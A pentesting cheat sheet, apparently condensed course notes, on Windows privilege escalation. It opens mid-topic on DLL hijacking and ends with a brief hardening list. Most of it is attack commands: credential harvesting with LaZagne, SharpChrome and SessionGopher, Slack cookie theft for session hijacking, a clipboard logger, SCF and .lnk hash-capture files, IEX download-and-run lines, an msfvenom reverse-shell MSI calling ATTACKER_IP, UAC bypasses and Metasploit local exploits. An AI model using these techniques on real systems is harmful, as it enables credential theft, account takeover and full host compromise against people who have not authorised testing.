If a target looks for a DLL it can't find (procmon shows NAME NOT FOUND on a .dll path), drop a malicious DLL at that path for code execution via DllMain on load.

```c
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        break;
    }
    return TRUE;
}
```
## Credential Hunting

Credentials may be found in config files, dictionaries, unattended install files, PowerShell history, and PowerShell credential objects.

### Application Configuration Files

Apps often store passwords in cleartext config files.

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

`/S` recurse subdirs | `/I` case-insensitive | `/M` print matching filenames only | `/C` literal string

IIS credentials may be in web.config, check C:\inetpub\wwwroot\web.config and search recursively for other copies.

### Dictionary Files

Spellcheck dictionaries can capture passwords a user added to avoid the red underline.

```powershell
gc 'C:\Users\<USERNAME>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

### Unattended Installation Files

unattend.xml may define autologon credentials in plaintext or base64, meant to be deleted post-install but copies sometimes remain elsewhere.

```xml
<AutoLogon>
    <Password>
        <Value><PASSWORD></Value>
        <PlainText>true</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <LogonCount>2</LogonCount>
    <Username>Administrator</Username>
</AutoLogon>
```

### PowerShell History File

PowerShell 5+ saves command history to disk, including any credentials passed on the command line.

```powershell
(Get-PSReadLineOption).HistorySavePath
```

Default path: C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

Re-check these files after gaining local admin.

### PowerShell Credentials

PowerShell credential objects are DPAPI-protected, decryptable only by the same user on the same host that created them, unless we gain code execution as that user.

```powershell
$encryptedPassword = Import-Clixml -Path '<FILE>'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server '<SERVER>' -User '<USERNAME>' -Password $decryptedPassword
```

```powershell
$credential = Import-Clixml -Path '<FILE>'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

## Other Files

Snaffler crawls network shares for interesting extensions (.kdbx, .vmdk, .vhdx, .ppk, etc). User home-share folders often have loose permissions and leak personal/sensitive data.

### Manually Searching the File System for Credentials

```cmd
findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

```powershell
select-string -Path C:\Users\<USERNAME>\Documents\*.txt -Pattern password
```

```cmd
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ *.config
```

```powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

### Sticky Notes Passwords

StickyNotes data is an SQLite database, not a plain text file.

```text
C:\Users\<USERNAME>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

Copy the three plum.sqlite* files down and open with DB Browser for SQLite, query `select Text from Note;`.

#### PSSQLite

```powershell
Import-Module .\PSSQLite.psd1
$db = '<FILE>'
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

#### strings

```bash
strings plum.sqlite-wal
```

### Other Files of Interest

```text
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

## Further Credential Theft

### Cmdkey Saved Credentials

```cmd
cmdkey /list
```

```powershell
runas /savecred /user:<DOMAIN>\<USERNAME> "<COMMAND>"
```

### Browser Credentials

SharpChrome retrieves cookies and saved logins from Chrome.

```powershell
SharpChrome.exe logins /unprotect
```

Generates detectable events: 4688 (process creation), 16385 (DPAPI activity), and possibly 4662/4663 (object/file access).

### Password Managers

Gaining access to a password manager (KeePass, 1Password, Thycotic, CyberArk) can lead to admin-level access across many systems. KeePass .kdbx files are usually protected by just a master password.

```bash
python2.7 keepass2john.py <FILE>
```

```bash
hashcat -m 13400 <FILE> rockyou.txt
```

`-m 13400` KeePass 1/2 hash mode

### Email

Search a compromised user's Exchange mailbox for terms like "pass", "creds", "credentials" using MailSniper.

### More Fun with Credentials

LaZagne retrieves credentials from browsers, chat clients, databases, email, memory dumps, sysadmin tools, and internal Windows storage (Autologon, Credman, DPAPI, LSA secrets).

```powershell
lazagne.exe all
```

Other modules besides `all`: chats, mails, git, svn, windows, wifi, maven, sysadmin, browsers, games, multimedia, memory, databases, php.

### Even More Fun with Credentials

SessionGopher finds and decrypts saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP sessions, and can search drives for .ppk, .rdp, .sdtid files.

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target <COMPUTER>
```

Needs local admin to pull every user's sessions from HKEY_USERS, run as current user too.

### Clear-Text Password Storage in the Registry

#### Windows AutoLogon

Stores username/password in cleartext, readable by standard users.

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

`AutoAdminLogon` 1 enables it | `DefaultUserName` account | `DefaultPassword` cleartext password

Use Sysinternals Autologon.exe to configure it safely instead (encrypts the password as an LSA secret).

#### Putty

Saved proxy connection credentials are stored in cleartext, tied to the user who saved them (check HKEY_USERS for other users if admin).

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION>
```

Look for `ProxyUsername` and `ProxyPassword` values.

### Wifi Passwords

Needs local admin.

```cmd
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```

`key=clear` reveals the pre-shared key under Key Content

## Citrix Breakout

Break out of restricted virtualization/remote desktop environments (Citrix, Terminal Services, AppStream, PSM, Kiosk).

1. Gain access to a Dialog Box.
2. Exploit the Dialog Box to achieve command execution.
3. Escalate privileges to gain higher levels of access.

### Bypassing Path Restrictions

Native app dialog boxes (Save/Open in Paint, Notepad, etc) can bypass File Explorer folder restrictions via a UNC path entered in the file name field.

```text
\\127.0.0.1\c$\users\<USERNAME>
```

### Accessing SMB share from restricted environment

```bash
smbserver.py -smb2support share $(pwd)
```

Access via a dialog box UNC path to the share, then right-click an executable and choose Open (direct copy via Explorer may be blocked).

```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

### Alternate Explorer

Q-Dir, Explorer++ bypass File Explorer folder restrictions enforced by GPO.

### Alternate Registry Editors

Simpleregedit, Uberregedit, SmallRegistryEditor bypass GPO blocking of the default Registry Editor.

### Modify existing shortcut file

1. Right-click the shortcut, select Properties.
2. Edit the Target field to the desired executable (e.g. cmd.exe).
3. Run the shortcut.

If no shortcut is available, transfer one over SMB or create one with PowerShell.

### Script Execution

If .bat/.vbs/.ps1 auto-execute via their interpreter, drop a script that spawns a console.

```cmd
cmd
```

### Escalating Privileges

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
Import-Module .\PowerUp.ps1
Write-UserAddMSI
```

Creates UserAdd.msi on the desktop, run it to add a local admin via GUI (password must meet complexity).

```cmd
runas /user:<USERNAME> cmd
```

### Bypassing UAC

```powershell
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

## Interacting with Users

### Traffic Capture

If Wireshark is installed, unprivileged users may capture traffic since restricting Npcap to Administrators isn't the default. net-creds can sniff passwords/hashes from a live interface or a pcap.

### Process Command Lines

```powershell
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

```powershell
IEX (iwr 'http://<ATTACKER_IP>/procmon.ps1')
```

### Vulnerable Services

CVE-2019-15752: Docker Desktop before 2.1.0.1 looked for missing credential helper binaries in C:\PROGRAMDATA\DockerDesktop\version-bin, misconfigured with full write access for BUILTIN\Users, letting any user plant an executable that runs on Docker start or `docker login`.

### SCF on a File Share

An SCF's IconFile can point to an attacker SMB share, triggering an auth request when the folder is browsed, capturable with Responder. Doesn't work on Server 2019+, use a .lnk file instead.

```text
[Shell]
Command=2
IconFile=\\<ATTACKER_IP>\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
sudo responder -w -v -I <INTERFACE>
```

```bash
hashcat -m 5600 <FILE> rockyou.txt
```

`-m 5600` NetNTLMv2

### Capturing Hashes with a Malicious .lnk File

Generate with Lnkbomb or PowerShell.

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("<FILE>")
$lnk.TargetPath = "\\<ATTACKER_IP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

## Pillaging

Extracting information (credentials, infrastructure details, sensitive data) from a compromised host to further access or meet engagement goals.

### Installed Applications

Check `C:\Program Files` and `C:\Program Files (x86)` for a quick list of installed software.

```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

### mRemoteNG

Stores connection info and credentials in confCons.xml (%USERPROFILE%\APPDATA\Roaming\mRemoteNG), encrypted with a hardcoded default master password `mR3m` if the user set none.

```bash
python3 mremoteng_decrypt.py -s "<ENCRYPTED_PASSWORD>"
python3 mremoteng_decrypt.py -s "<ENCRYPTED_PASSWORD>" -p <PASSWORD>
```

```bash
for password in $(cat <WORDLIST>);do echo $password; python3 mremoteng_decrypt.py -s "<ENCRYPTED_PASSWORD>" -p $password 2>/dev/null;done
```

Cracking the `Protected` attribute confirms the master password (`Password: ThisIsProtected`); cracking a node's `Password` attribute reveals the cleartext credential.

### Abusing Cookies to Get Access to IM Clients

Stealing a session cookie bypasses credentials and MFA for web apps like Slack. The `d` cookie holds Slack's auth token.

#### Cookie Extraction from Firefox

```powershell
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

```bash
python3 cookieextractor.py --dbpath "<FILE>" --host slack --cookie d
```

Load the extracted cookie into a browser cookie-editor extension on the target site to hijack the session.

#### Cookie Extraction from Chromium-based Browsers

Chromium cookies are DPAPI-encrypted, SharpChromium decrypts them from the compromised user's own session.

```powershell
IEX(New-Object Net.WebClient).DownloadString('<URL>')
Invoke-SharpChromium -Command "cookies slack.com"
```

Current Chrome stores cookies at …\Default\Network\Cookies, but SharpChromium looks in the older …\Default\Cookies path.

```powershell
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

Paste a copied cookie value as one line.

### Clipboard

Clipboard-pasted credentials (e.g. from password managers) bypass keylogging.

```powershell
IEX(New-Object Net.WebClient).DownloadString('<URL>')
Invoke-ClipboardLogger
```

### Roles and Services

Profile each host's role: file/print servers, web/database servers, CA servers, source code management, backup servers.

#### Attacking Backup Servers

Backup accounts often need local admin on their targets. Example: restic.

```powershell
mkdir <DIR>; restic.exe -r <DIR> init
```

```powershell
$env:RESTIC_PASSWORD = '<PASSWORD>'
restic.exe -r <DIR> backup <TARGET_FILE>
```

```powershell
restic.exe -r <DIR> backup C:\Windows\System32\config --use-fs-snapshot
```

`--use-fs-snapshot` uses VSS to back up locked files, still needs read access to the source.

```powershell
restic.exe -r <DIR> snapshots
restic.exe -r <DIR> restore <SNAPSHOT_ID> --target <DIR_2>
```

On a found backup, target SAM/SYSTEM hives (Windows) or /etc/shadow and .ssh keys (Linux), plus web.config and other credential files.

## Miscellaneous Techniques

### Living Off The Land Binaries and Scripts (LOLBAS)

Microsoft-signed native/downloadable binaries with unexpected attacker-useful functionality (code execution, compilation, file transfer, persistence, UAC bypass, credential theft, memory dumping, keylogging, evasion, DLL hijacking).

```powershell
certutil.exe -urlcache -split -f <URL> <FILE>
```

```cmd
certutil -encode <FILE> <OUTPUT_FILE>
certutil -decode <OUTPUT_FILE> <FILE_2>
```

rundll32.exe can execute a DLL (downloaded or SMB-hosted) for a reverse shell.

### Always Install Elevated

GPO setting under Computer/User Configuration\Administrative Templates\Windows Components\Windows Installer.

```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

`AlwaysInstallElevated` REG_DWORD 1 on both keys means the policy is enabled on the target.

```bash
msfvenom -p windows/shell_reverse_tcp lhost=<ATTACKER_IP> lport=<PORT> -f msi > <FILE>
```

```cmd
msiexec /i <FILE> /quiet /qn /norestart
```

Installs with SYSTEM privileges regardless of the invoking user. Mitigated by disabling the two GPO settings.

### CVE-2019-1388

UAC Certificate Dialog flaw. A binary signed with a certificate populating the SpcSpAgencyInfo field (OID 1.3.6.1.4.1.311.2.1.10) renders a hyperlink in the UAC prompt's Issued By field. Example binary: hhupd.exe.

1. Right-click the binary, Run as administrator.
2. Click "Show information about the publisher's certificate".
3. Click the hyperlink in the Issued by field, then OK, a browser launches as SYSTEM.
4. In the browser, View page source, then Save As.
5. In the Save As dialog, type a path to an executable (e.g. `c:\windows\system32\cmd.exe`) to launch it as SYSTEM.

Patched November 2019.

### Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
```

```powershell
Get-ScheduledTask | select TaskName,State
```

Standard users can't list tasks under C:\Windows\System32\Tasks (admin-only), but a writable script run by a privileged scheduled task is still abusable.

```cmd
accesschk64.exe /accepteula -s -d <DIR>
```

Append a payload to a writable script if its scheduled task runs with elevated rights.

### User/Computer Description Field

```powershell
Get-LocalUser
```

```powershell
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

Sysadmins sometimes store account details, even passwords, in the description field.

### Mount VHDX/VMDK

.vhd/.vhdx (Hyper-V) and .vmdk (VMware) files found on shares may be live machine backups. Snaffler helps locate them.

```bash
guestmount -a <FILE> -i --ro /mnt/vmdk
guestmount --add <FILE_2> --ro /mnt/vhdx/ -m /dev/sda1
```

On Windows, right-click Mount for .vhd/.vhdx or Map Virtual Disk for .vmdk, or use the Mount-VHD cmdlet.

```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

## Legacy Operating Systems

Older Windows versions lack modern mitigations and stop receiving patches once EOL, leaving flaws like SIGRed (CVE-2020-1350) and EternalBlue (CVE-2017-0144) unpatched until the system is upgraded, retired, or network-segregated.

## Windows Server

### Server 2008 Case Study

Enumeration tools for legacy hosts: Sherlock, Windows-Exploit-Suggester (compares `systeminfo` output against the Microsoft vulnerability database, suggests Metasploit modules).

```powershell
Import-Module .\Sherlock.ps1
Find-AllVulns
```

Flags vulnerable MS bulletins with CVE IDs and exploit-db/PoC links, filter out DoS-only and architecture-mismatched results.

#### Gaining a Shell with smb_delivery

```text
search smb_delivery
use exploit/windows/smb/smb_delivery
set target 0
exploit
```

Run on the target to trigger the callback:

```cmd
rundll32.exe \\<ATTACKER_IP>\<SHARE>\<FILE>,0
```

#### Exploiting MS10-092 (Task Scheduler)

Migrate to a 64-bit process first or the exploit fails.

```text
migrate <PID>
background
search 2010-3338
use exploit/windows/local/ms10_092_schelevator
set SESSION 1
set lhost <ATTACKER_IP>
set lport <PORT>
exploit
```

## Windows Desktop Versions

### Windows 7 Case Study

```bash
sudo python2 windows-exploit-suggester.py --update
```

```bash
python2 windows-exploit-suggester.py --database <FILE> --systeminfo <FILE_2>
```

Takes saved `systeminfo` output and a downloaded vulnerability database xls file, outputs potential exploits tagged [M] Metasploit or [E] exploit-db. Filter out DoS-only and non-applicable results.

```powershell
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
```

Abuses the Secondary Logon Service to steal a SYSTEM token.

## Windows Hardening

Key hardening measures that block many of the techniques above:

- Secure boot and BitLocker disk encryption enabled and in use.
- Audit writable files/directories and binaries that can launch other apps.
- Scheduled tasks and scripts running with elevated privileges specify binaries using absolute paths.
- No cleartext credentials in world-readable files on the host or shared drives.
- Clean home directories and PowerShell history.
- Low-privileged users cannot modify custom libraries called by programs.
- Remove unnecessary packages and services.
- Device Guard and Credential Guard enabled on Windows 10 and newer Server OSes.
- Group Policy enforces configuration changes across systems.